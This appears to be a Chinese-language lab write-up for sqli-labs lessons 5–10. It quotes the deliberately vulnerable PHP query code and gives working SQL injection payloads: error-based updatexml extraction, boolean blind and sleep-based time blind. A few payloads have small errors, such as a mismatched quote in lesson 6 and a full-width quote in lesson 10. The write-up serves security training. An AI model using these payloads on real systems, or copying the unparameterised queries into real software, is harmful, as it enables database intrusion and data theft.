---
description: 注入结果反馈方法
---

# lesson5-lesson10

* source :

  ```php
  if(isset($_GET['id']))
  {
  $id=$_GET['id'];
  }
  ```

* sink:  

```php
// connectivity 
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

同lesson1, 这又是一个单引号闭合。

* output:

```php
	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    echo "</font>";
  }
	else 
	{
		echo '<font size="3" color="#FFFF00">';
		print_r(mysql_error());
		echo "</br></font>";	
		echo '<font color= "#0000ff" font size= 3>';	
	}
```

第五关开始， 这个地方保留了显错注入， 但是没有了联合注入， 登陆成功不现实数据库查处的任何字段\(You are in ...），可以利用这句话的存在与否进行布尔型盲注。



* 报错注入： 通过 `print_r(mysql_error())`

  * xpath:  `index.php?id=1' and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+`

* 盲注：

  * 时间
  * boolean

       

            index.php?id=1' and if\(\(substr\(user\(\),1,1\)='r'\),1,0\)--+



## lesson6

* sink

```php
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

同lesson4，这里又是一个双引号闭合。

* 报错注入： 通过 `print_r(mysql_error())`

  * xpath:  `index.php?id=1' and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+`

* 盲注：

  * 时间

          index.php?id=1" and if\(\(substr\(user\(\),1,1\)='r'\),sleep\(5\), 0\)--+

  * boolean

    index.php?id=1" and if\(\(substr\(user\(\),1,1\)='r'\),1, 0\)--+

## lesson7

* sink

```php
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

单引号闭合，加双重括号型的。

* output

```php
	if($row)
	{
  	echo '<font color= "#FFFF00">';	
  	echo 'You are in.... Use outfile......';
  	echo "<br>";
  	echo "</font>";
  	}
	else 
	{
		echo '<font color= "#FFFF00">';
		echo 'You have an error in your SQL syntax';
		//print_r(mysql_error());
		echo "</font>";  
	}
}
	else 
	{ 
		echo "Please input the ID as parameter with numeric value";
	}

```

看这里把\`mysql\_error\(\)注释掉了， 所以没有报错注入了。

* 盲注：

  * 时间

          index.php?id=1'\)\) and if\(\(substr\(user\(\),1,1\)='r'\),sleep\(5\), 0\)--+

  * boolean

    index.php?id=1'\)\) and if\(\(substr\(user\(\),1,1\)='r'\),1, 0\)--+

## lesson8

* sink

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result)；
```

这儿简单了， 单引号闭合。



* output

```php
	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="5" color="#FFFF00">';
	//echo 'You are in...........';
	//print_r(mysql_error());
	//echo "You have an error in your SQL syntax";
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

```

这里多了注释，但是仍然可以通过显不显示\`You are in \`构造布尔型注入。



* 盲注：

  * 时间

          index.php?id=1' and if\(\(substr\(user\(\),1,1\)='r'\),sleep\(5\), 0\)--+

  * boolean

    index.php?id=1' and if\(\(substr\(user\(\),1,1\)='r'\),1, 0\)--+

## lesson9

* output

```php
    	echo '<font size="5" color="#FFFF00">';
    	echo 'You are in...........';
    	//print_r(mysql_error());
    	//echo "You have an error in your SQL syntax";
    	echo "</br></font>";
    	echo '<font color= "#0000ff" font size= 3>';
	
```

其他和lesson8完全一样， 就这里少注释一句。造成无法正常布尔注入，因为无论怎样都会显示\`You are in \`。



* 盲注：

  * 时间

          index.php?id=1' and if\(\(substr\(user\(\),1,1\)='r'\),sleep\(5\), 0\)--+

## lesson10

* sink

```php
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

双引号闭合， 其他与lesson9相同。



* 盲注：

  * 时间

          index.php?id=1“ and if\(\(substr\(user\(\),1,1\)='r'\),sleep\(5\), 0\)--+

